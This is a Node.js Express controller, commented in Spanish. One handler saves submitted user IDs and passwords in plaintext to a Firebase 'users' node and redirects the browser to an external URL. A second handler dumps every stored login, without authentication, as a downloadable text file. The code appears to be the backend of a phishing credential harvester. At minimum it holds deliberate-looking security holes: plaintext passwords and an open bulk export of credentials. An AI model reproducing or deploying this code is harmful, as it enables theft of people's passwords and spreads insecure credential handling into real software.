const { response, request } = require(`express`);

const { dbfirebase, dbfirestone } = require("../db/firebase");

const userdb = dbfirebase.ref('users/')


const currentDate = new Date();


const postUsuario = async (req = request, res = response) => {

    const { userId, password } = req.body;




    userdb.push().set({
        mail: userId,
        password: password
    }).then(usuarioGuardado => {
        res.redirect(`${process.env.URLDES}apply`)

        // res.status(200).json({
        //     msg: 'Usuario guardado exitosamente',
        //     ok: true

        // });
    })
        .catch(error => {
            console.error('Error al guardar el usuario:', error);
            res.status(500).json({
                msg: 'Error-> al guardar el usuario',
                ok: false
            });
        });



}

function generateUniqueId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Generar el nombre del archivo con un ID único


const getLogins = async (req, res) => {
    await userdb.once('value')
        .then(datos => {
            const userdata = datos.val();
            const uniqueId = generateUniqueId();

            res.setHeader('Content-disposition', `attachment; filename=${uniqueId}${currentDate}.txt`);
            res.set('Content-Type', 'text/plain');
            res.send(userdata);
            
            
        })
        .catch(error => {
            console.error('Error al guardar el usuario:', error);
            res.status(500).json({
                msg: 'Error-> al guardar el usuario',
                ok: false
            });
        });

}




module.exports = {
    postUsuario,
    getLogins,


}